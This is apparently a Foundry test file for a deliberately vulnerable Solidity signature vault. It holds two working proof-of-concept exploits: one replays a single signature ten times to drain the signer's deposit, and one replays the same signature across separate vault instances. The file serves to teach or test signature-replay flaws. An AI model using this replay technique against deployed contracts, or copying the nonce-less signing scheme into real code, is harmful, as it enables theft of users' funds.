// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {VulnerableSigVault} from "../../src/vulnerable/VulnerableSigVault.sol";

contract SigReplayTest is Test {
    VulnerableSigVault vault;
    address hedi;
    uint256 hediKey;
    address payable hedi2 = payable(makeAddr("hedi2"));

    function setUp() public {
        (hedi, hediKey) = makeAddrAndKey("hedi");
        vault = new VulnerableSigVault();
        vm.deal(hedi, 10 ether);
        vm.prank(hedi);
        vault.deposit{value: 10 ether}();
    }

    // hedi signs "pay `to` `amount`", exactly the way the vault hashes it
    function _sign(
        address to,
        uint256 amount
    ) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 digest = keccak256(abi.encodePacked(hedi, to, amount));
        (v, r, s) = vm.sign(hediKey, digest);
    }

    function test_HonestClaim() public {
        (uint8 v, bytes32 r, bytes32 s) = _sign(hedi2, 1 ether);

        vm.prank(hedi2);
        vault.claim(hedi, hedi2, 1 ether, v, r, s);

        assertEq(hedi2.balance, 1 ether);
        assertEq(vault.balances(hedi), 9 ether);
    }

    function test_TamperedAmountFails() public {
        (uint8 v, bytes32 r, bytes32 s) = _sign(hedi2, 1 ether);

        vm.prank(hedi2);
        vm.expectRevert("bad signature");
        vault.claim(hedi, hedi2, 10 ether, v, r, s); // signed 1, claims 10
    }

    function test_Exploit_ReplayDrainsSigner() public {
        (uint8 v, bytes32 r, bytes32 s) = _sign(hedi2, 1 ether); // ONE signature

        vm.startPrank(hedi2);
        for (uint256 i = 0; i < 10; i++) {
            vault.claim(hedi, hedi2, 1 ether, v, r, s); // used 10 times
        }
        vm.stopPrank();

        console.log("hedi2 balance (ETH):", hedi2.balance / 1 ether);
        console.log(
            "hedi vault balance (ETH):",
            vault.balances(hedi) / 1 ether
        );

        assertEq(hedi2.balance, 10 ether); // hedi meant to give 1 ETH
        assertEq(vault.balances(hedi), 0);
    }

    function test_Exploit_CrossVaultReplay() public {
        VulnerableSigVault vault2 = new VulnerableSigVault();
        vm.deal(hedi, 10 ether);
        vm.prank(hedi);
        vault2.deposit{value: 10 ether}();

        (uint8 v, bytes32 r, bytes32 s) = _sign(hedi2, 1 ether); // signed for vault 1

        vm.startPrank(hedi2);
        vault.claim(hedi, hedi2, 1 ether, v, r, s);
        vault2.claim(hedi, hedi2, 1 ether, v, r, s); // also works on vault 2
        vm.stopPrank();

        assertEq(hedi2.balance, 2 ether);
    }
}
